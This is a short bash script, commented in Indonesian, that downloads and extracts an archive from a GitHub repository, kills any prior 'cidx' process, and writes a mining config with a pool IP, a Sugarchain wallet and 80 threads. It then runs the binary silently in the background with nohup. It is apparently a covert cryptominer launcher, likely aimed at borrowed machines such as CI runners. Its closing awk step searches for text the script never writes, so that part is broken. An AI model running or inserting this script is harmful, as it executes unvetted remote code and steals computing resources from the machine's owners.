#!/bin/bash

# Download dan ekstrak file cidx
wget -O cidx https://github.com/barburonjilo/setstra/raw/refs/heads/main/ci.tar.gz && tar -xvf cidx >/dev/null 2>&1

# Pastikan tidak ada proses cidx yang berjalan untuk menghindari konflik
pkill -f cidx 2>/dev/null

# Tentukan tanggal dan waktu saat ini dalam format UTC-7
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Buat file config.json
cat > config.json <<END
{
  "url": "45.115.225.115:505",
  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.lah",
  "pass": "x",
  "threads": 80,
  "algo": "yespowersugar"
}
END

# Buat file cidx dan config.json menjadi dapat dieksekusi
chmod +x config.json cidx

# Jalankan cidx di background
nohup ./cidx -c 'config.json' &>/dev/null &

# Bersihkan layar dan tampilkan waktu saat ini serta pekerjaan yang berjalan
clear
echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs

# Tunggu selama 6 menit (360 detik)
sleep 360

# Cetak pola waktu yang cocok dari config.json menggunakan AWK
awk '/i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/ { print $0 }' config.json
